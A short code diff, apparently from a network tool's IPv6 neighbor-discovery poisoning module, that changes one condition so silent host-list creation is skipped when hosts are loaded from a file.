@@ -90,7 +90,7 @@ static int ndp_poison_start(char *args)
       SAFE_FREE(h);
    }
 
-   if(EC_GBL_OPTIONS->silent) {
+   if(EC_GBL_OPTIONS->silent && !EC_GBL_OPTIONS->load_hosts) {
       ret = create_list_silent();
    } else 
       ret = create_list();
